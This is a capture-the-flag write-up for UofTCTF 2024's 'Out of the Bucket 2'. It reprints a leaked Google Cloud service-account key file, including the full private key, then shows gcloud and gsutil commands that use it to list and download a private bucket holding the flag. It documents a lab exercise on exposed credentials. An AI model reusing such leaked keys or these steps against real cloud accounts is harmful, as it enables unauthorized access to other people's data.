---
title: "Ouf of the Bucket 2"
description: "This is a continuation of \"Out of the Bucket\". Take a look around and see if you find anything!"
pubDate: 2024-01-15
ctf: "UofTCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-uoftctf/icon.png"
---

Looking at the entries from '[Out of the Bucket](/writeups/24-uoftctf-out-of-the-bucket-2)' I see `secret/funny.json` which contains the following:

```json
{
  "type": "service_account",
  "project_id": "out-of-the-bucket",
  "private_key_id": "21e0c4c5ef71d9df424d40eed4042ffc2e0af224",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWxpWEDNiWgMzz\nxDDF64CspqiGPxkrHfhS4/PX8BrxNjUMPAH7vYHE3KbgQsmPhbCte9opnSLdMqec\nWjll8lRZGEy73xhWd2e3tVRAf53r+pW/p6MTOsz3leUkQAscG4hmOVOpGb1AkfuE\n62NErJVZIgQCowrBdFGbPxQc/IRQJKzrCFfKOWSHLvnngr4Ui5CSr6OM33dfpD+v\nQSLkEQheYCXmHwh/Wf8b27be+RzfOp/hOyjKsJOmDvFu2+rrx24t8hCptof3BYol\nUjpaiB8Qcct/HoKOEvZ/S5rW6toQizP8t4t7urC2i70JdH+Y4Qw/AZJNuLo/5wW1\n+x8i3FIDAgMBAAECggEABaGapVC06RVNdQ1tffL+d7MS8296GHWmX34B6bqDlP7S\nhenuNLczoiwVkAcQQ9wXKs/22Lp5rIpkd1FXn0MAT9RhnAIYdZlB4JY3iaK5oEin\nXn67Dt5Ze3BfBq6ghpx43L1KDUKogfs8jgVMoANVEyDfhrYsVQWDZ5T60QZp7bP2\n0zSDSACZpFzdf1vXzOhero8ykwM3keQiCIKWYkeMGsX8oHyWr1fz7AkU+pLciV67\nek10ItJUV70n2C65FgrW2Z1TpPKlpNEm8jQLSax9Bi89HuFEw8UjTfxKKzhLFXEu\nudtAyebt/PC4HS9FLBioo3bAy8vL3o00b7+raVyJQQKBgQD3IWaD5q5s7H0r10S/\n7IUhP1TDYhbLh7pupbzDGzu9wCFCMItwTEm9nYVNToKwV+YpeyoptEHQa4CAVp21\nO4+W7mBQgYemimjTtx1bIW8qzdQ9+ltQXyFAxj6m3KcuAsAzSpcHkbP46lCL5QoT\nTS6T06Fs4xvnTKtBdPeisSgiIwKBgQDee+mp5gsk8ynnp6fx0/liuO3AZxpTYcP8\nixaXLQI6CI4jQP2+P+FWNCTmEJxMaddXNOmmTaKu25S2H0KKMiQkQPuwBqskck3J\npVTHudnUuZAZWE7YPg40MJgg5OQhMVwiqGWL76FT2bubIdNm4LQyxvDeK82XQYl8\nszeOXfJeoQKBgGQqSoXdwwbtF5Lkbr4nnJIsPCvxHvIhskPUs1yVNjKjpBdS28GJ\nej37kaMS1k+pYOWhQSakJCTY3b2m3ccuO/Xd6nXW+mdbJD/jsWdVdtxvjr4MMmSy\nGiVJ9Ozm9G/mt4ZSjkKIIN0cA8ef7uSB3QYXug8LQi0O2z7trM1pZq3nAoGAMPhD\nOSMqRsrC6XtMivzmQmWD5zqKX9oAAmE26rV8bPufFYFjmHGFDq1RhdYYIPWW8Vnz\nJ6ik6ynntKJyyeo5bEVlYJxHJTGHj5+1ZnSwzpK9dearDAu0oqYjhfH7iJbNuc8o\n8sEe2E7vbTjnyBgjcZ26PJyVlvpU4b6stshU5aECgYEA7ZESXuaNV0Er3emHiAz4\noEStvFgzMDi8dILH+PtC3J2EnguVjMy2fceQHxQKP6/DCFlNqf9KUNqJBKVGxRWP\nIM1rcoAmf0sGQ5gl1B1K8PidhOi3dHF0nkYvivuMoj7sEyr9K88y69kdpVJ3J556\nJWqkWLCz8hx+LcQPfDJu0YE=\n-----END PRIVATE KEY-----\n",
  "client_email": "image-server@out-of-the-bucket.iam.gserviceaccount.com",
  "client_id": "102040203348783466577",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/image-server%40out-of-the-bucket.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```

Looking into this format it seems to be a Google authentication JSON for a service account. I start by [installing the `gcloud` tool locally](https://cloud.google.com/sdk/docs/install) and then authenticate myself on `gcloud` with the json.

```
$ ./gcloud auth activate-service-account --key-file funny.json
Activated service account credentials for: [image-server@out-of-the-bucket.iam.gserviceaccount.com]
```

Now that we have authenticated, I utilise `gsutil` to probe the buckets.

```
$ ./gsutil ls
gs://flag-images/
gs://out-of-the-bucket/
```

`flag-images` is new, what's in there?

```
$ ./gsutil ls gs://flag-images/
gs://flag-images/256x192/
$ ./gsutil ls gs://flag-images/256x192/
gs://flag-images/256x192/ad.png
gs://flag-images/256x192/ae.png
...
gs://flag-images/256x192/za.png
gs://flag-images/256x192/zm.png
gs://flag-images/256x192/zw.png
```

Lot's of pictures! Let's take a look at these locally.

```
$ ./gsutil -m cp "gs://flag-images/256x192/*" ~/CTFS/OutOfBucket2/flags/ 
...
Copying gs://flag-images/256x192/yt.png...% Done
Copying gs://flag-images/256x192/za.png...% Done
Copying gs://flag-images/256x192/zw.png...% Done
Copying gs://flag-images/256x192/zm.png...% Done
/ [255/255 files][  1.4 MiB/  1.4 MiB] 100% Done
Operation completed over 255 objects/1.4 MiB.
```

After looking through the files one particular one catches my eye just on the thumbnail: `xa.png`.

Which contains our flag!

![Flag](images/24-uoftctf/out-of-bucket-2.png)

Flag: `uoftctf{s3rv1c3_4cc0un75_c4n_83_un54f3}`